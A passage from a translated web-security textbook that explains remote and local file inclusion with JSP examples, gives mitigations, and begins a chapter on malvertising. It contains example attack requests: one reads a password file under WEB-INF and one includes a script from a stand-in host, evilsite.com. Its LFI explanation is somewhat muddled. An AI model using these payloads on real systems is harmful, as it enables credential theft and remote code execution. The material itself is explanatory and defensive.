    # Chapter 28


    # Remote File Inclusion (RFI)


    RFI（远程文件包含）是一种攻击，它针对动态引用外部脚本的 Web 应用程序中的漏洞。攻击者的目标是利用应用程序的引用功能，从不同域的远程 URL 上传恶意软件。成功的
    RFI 攻击可能导致网站被接管、服务器被攻破或信息被盗。


    LFI（本地文件包含）类似于 RFI。它是通过 Web 浏览器将受感染文件上传到服务器。大多数情况下，这两者会被一起提及。两者都允许将恶意软件上传到目标服务器。唯一的区别是，LFI
    攻击利用本地文件上传中的不安全函数。这允许进行恶意攻击。攻击者随后能够直接将恶意软件上传到受攻破的系统，而不是通过受攻破的外部引用函数从远程位置访问它（如
    RFI 中那样）。


    ## Example of Remote File Inclusion


    为了理解 RFI 渗透是如何执行的，请考虑以下示例：


    包含以下代码行的 JSP：

    ```

    <jsp:include page="<%=(String)request.getParmeter("ParamName")%>">

    ```

    可通过以下请求进行操纵：

    `Page1.jsp?ParamName=/WEB-INF/DB/password`


    处理此请求时，攻击者可以看到密码内容文件。


    具有请求 URL 内容的导入语句的 Web 应用程序：

    ```

    <c:import url="<%=request.getParameter("conf")%>">

    ```


    如果此语句未经过清理，可用于注入恶意软件。


    例如：`Page2.jsp?conf=https://evilsite.com/attack.js`。操纵请求参数使其引用远程文件，也是发起 RFI 攻击的一种方法。


    ## DIY Prevention and Mitigation of RFI


    使用适当的清理和输入验证，可以降低 RFI 攻击的风险。然而，当你选择这样做时，必须记住无法完全清理所有用户输入。因此，你应该将清理作为更好安全解决方案的补充。话虽如此，始终建议尽可能彻底地清理受控/用户提供的输入。输入包括：


    *   HTTP 头值

    *   Cookie 值

    *   URL 参数

    *   GET/POST 参数


    在清理过程中，根据白名单（允许的字符集）检查输入字段，而不是黑名单（不允许的恶意字符）。基本上，黑名单验证不是一个强有力的解决方案。攻击者可以决定以其他格式（如十六进制或编码格式）提供输入。


    另一个好的做法是在服务器端应用输出验证机制。客户端的验证功能也无法免疫代理工具攻击，因为它们具有减轻处理开销的优势。


    最后，限制上传目录的执行权限。此外，考虑建立允许的文件类型白名单，例如 `JPG`、`DOC`、`PDF` 等，并限制上传文件的大小。适当的文件管理和输入清理实践单独使用是不够的。大多数攻击仍然会发生，因为
    DIY 实践助长了一种虚假的安全感。寻找其他高效解决方案，如 `Imperva WAF`（Web 应用防火墙）。


    ---


    # Chapter 29


    # Malvertising


    这是指攻击者将恶意代码插入在线广告网络中。该代码随后将用户重定向到欺诈网站。这种攻击让黑客有机会针对知名网站的用户，如 `The London Stock
    Exchange`、`The Atlantic`、`The New York Times Online` 和 `Spotify`。


    在线广告的生态系统是一个非常复杂的网络。它涉及内容分发网络（`CDNs`）、重定向网络、广告服务器、广告交易平台和发布商网站。当互联网用户点击某个广告时，会在各种服务器之间发生多次重定向。攻击者利用这种复杂性，将恶意软件放置在广告网络和发布商不会怀疑的地方。


    人们经常将 Malvertising 与 Adware 或广告恶意软件混淆。


    **Adware** 是运行在用户计算机上的程序。在大多数情况下，它嵌入在合法软件中，用户在不知情的情况下安装它。它挖掘用户数据以定向广告，弹出不需要的广告，并将用户的搜索请求重定向到其他广告网站。


    **Ad malware** 和 **Malvertising** 在几个方面有所不同：


    *   Adware 针对个别用户，而 Malvertising 中的恶意代码部署在广告商的网页上。

    *   只有访问受感染网页的人会受到 Malvertising 的影响，而 Adware 会继续在受感染的计算机上运行。


    ## Effects of Malvertisements on Web Users

